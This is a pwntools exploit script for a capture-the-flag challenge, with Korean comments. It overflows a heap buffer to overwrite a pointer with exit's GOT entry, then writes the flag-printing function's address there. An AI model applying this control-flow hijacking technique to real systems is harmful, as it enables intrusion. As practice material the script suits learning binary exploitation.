from pwn import *

'''
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
'''

context(arch='amd64', os='linux')

r = remote("ctf.j0n9hyun.xyz", 3016)

# 동적할당한 공간에 또 동적할당을 해서
# 처음 할당한 공간에 다음 할당한 공간의 주소 값이 있다.
# 다음과 같이 2번 할당해 두번째 할당한 8byte공간에 입력을 받는다
'''
  16 byte
+------------------+        +-----------+
|  1  |   | pointer  ------>|   8byte   |
+------------------+        +-----------+
+------------------+        +-----------+
|  2  |   | pointer  ------>|   8byte   |
+------------------+        +-----------+
'''

# 입력을 받을 때 4096 byte만큼 받아 bof 취약점이 있다.
# 입력을 받은 뒤 exit함수를 실행하므로,
# 1번의 공간에 입력을 받을 때 2번의 포인터를 exit_got주소로 덮었다.
# 이후 2번에서 입력 받을 때 got로 입력이 받아지므로 flag를 출력하는 주소로 입력했다.

print_flag = p64(0x400826)
exit_got = p64(0x601068)
dummy = b"A"*40

payload  = dummy
payload += exit_got

r.sendline(payload)
r.sendline(print_flag)

r.interactive()